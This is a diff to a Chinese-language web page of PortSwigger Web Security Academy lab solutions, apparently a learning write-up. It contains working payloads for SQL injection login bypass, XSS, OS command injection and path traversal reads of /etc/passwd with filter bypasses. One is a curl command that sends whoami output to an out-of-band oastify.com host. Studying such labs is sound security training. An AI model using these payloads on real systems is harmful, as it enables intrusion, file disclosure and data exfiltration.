@@ -7,7 +7,7 @@ export default function Post() {
             <X.H2>Ap: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data</X.H2>
             <X.P>给了查询的SQL语句示例：</X.P>
             <X.CodeBlock language="sql" code="SELECT * FROM products WHERE category = 'Gifts' AND released = 1" />
-            <X.P>构造`payload`为`Gifts' or 1=1 --`，输入URL`/filter?category=Gifts%27%20or%201=1%20--`。</X.P>
+            <X.P>构造payload为`Gifts' or 1=1 --`，输入URL`/filter?category=Gifts%27%20or%201=1%20--`。</X.P>
             <X.H2>Ap: SQL injection vulnerability allowing login bypass</X.H2>
             <X.P>直接用用户名`administrator' --`；或用户名`administrator`，密码`1' or 1=1 --`。</X.P>
             <X.H1>XSS: Cross-site scripting</X.H1>
@@ -34,7 +34,7 @@ export default function Post() {
                 }
                 `}
             />
-            <X.P>构造`payload`为{'`"><script>alert(0)</script>`'}，输入搜索即可。</X.P>
+            <X.P>构造payload为{'`"><script>alert(0)</script>`'}，输入搜索即可。</X.P>
             <X.H2>Ap: DOM XSS in innerHTML sink using source location.search</X.H2>
             <X.P>页面中有如下代码：</X.P>
             <X.CodeBlock
@@ -49,7 +49,7 @@ export default function Post() {
                 }
                 `}
             />
-            <X.P>构造`payload`为{'`<img src=0 onerror="alert(0)">`'}，输入搜索即可。</X.P>
+            <X.P>构造payload为{'`<img src=0 onerror="alert(0)">`'}，输入搜索即可。</X.P>
             <X.H2>Ap: DOM XSS in jQuery anchor href attribute sink using location.search source</X.H2>
             <X.P>`/feedback`页面中有如下代码：</X.P>
             <X.CodeBlock
@@ -60,7 +60,7 @@ export default function Post() {
                 });
                 `}
             />
-            <X.P>注入点是`a`标签的`href`，`payload`为`javascript:alert(0)`。输入URL`/feedback?returnPath=javascript:alert(0)`，然后点击这个`a`标签。</X.P>
+            <X.P>注入点是`a`标签的`href`，payload为`javascript:alert(0)`。输入URL`/feedback?returnPath=javascript:alert(0)`，然后点击这个`a`标签。</X.P>
             <X.H2>Ap: DOM XSS in jQuery selector sink using a hashchange event</X.H2>
             <X.P>注入点：</X.P>
             <X.CodeBlock
@@ -137,7 +137,7 @@ export default function Post() {
             <X.P>提示了网站会用参数直接执行shell脚本，所以：</X.P>
             <X.CodeBlock language="python" code={`resp = requests.post(url, data={"productId": 1, "storeId": "; whoami"})`} />
             <X.H2>Pr: Blind OS command injection with time delays</X.H2>
-            <X.P>时间盲注，测试后发现可以注入的参数是`email`，一个可行的`payload`是`;sleep 10;`。</X.P>
+            <X.P>时间盲注，测试后发现可以注入的参数是`email`，一个可行的payload是`;sleep 10;`。</X.P>
             <X.CodeBlock
                 language="python"
                 code={`
@@ -171,7 +171,34 @@ export default function Post() {
             <X.P>需要得到当前登录用户的用户名，`email`参数改为{'`;curl hpa3cxzl0pvcovdqpo2uqs21bshm5et3.oastify.com/$(whoami);`'}，可以在Collaborator HTTP请求记录中看到`GET /peter-BPPYsm HTTP/1.1`。</X.P>
             <X.H1>Path traversal</X.H1>
             <X.H2>Ap: File path traversal, simple case</X.H2>
-            <X.P>随便检查一个图片，地址为`/image?filename=23.jpg`，改为`/txt?filename=../../../etc/passwd`即可。</X.P>
+            <X.P>观察到正常请求图片的方式为`/image?filename=23.jpg`，构造payload为`/image?filename=../../../../etc/passwd`：</X.P>
+            <X.CodeBlock
+                language="python"
+                code={`
+                import requests
+
+                url = "https://0a0d000b031e427780e062f9002d0083.web-security-academy.net/image?filename=../../../etc/passwd"
+                resp = requests.get(url)
+                print(resp.text)
+                `}
+            />
+            <X.H2>Pr: File path traversal, traversal sequences blocked with absolute path bypass</X.H2>
+            <X.P>payload为`/image?filename=/etc/passwd`。</X.P>
+            <X.H2>Pr: File path traversal, traversal sequences stripped non-recursively</X.H2>
+            <X.P>双写绕过，payload为`/image?filename=....//....//....//etc/passwd`。</X.P>
+            <X.H2>Pr: File path traversal, traversal sequences stripped with superfluous URL-decode</X.H2>
+            <X.P>双重URL编码绕过：</X.P>
+            <X.CodeBlock
+                language="python"
+                code={`
+                payload = "../../../etc/passwd".replace(".", "%2e").replace("%", "%25")
+                url = "https://0aad00d204570d5980a7fd6f00e600c7.web-security-academy.net/image?filename=" + payload
+                `}
+            />
+            <X.H2>Pr: File path traversal, validation of start of path</X.H2>
+            <X.P>payload为`/image?filename=/var/www/images/../../../etc/passwd`。</X.P>
+            <X.H2>Pr: File path traversal, validation of file extension with null byte bypass</X.H2>
+            <X.P>payload为`/image?filename=../../../etc/passwd%00.jpg`。</X.P>
             <X.H1>Access control vulnerabilities</X.H1>
             <X.H2>Ap: Unprotected admin functionality</X.H2>
             <X.P>在`robots.txt`中发现`/administrator-panel`，可以直接访问管理员面板。</X.P>
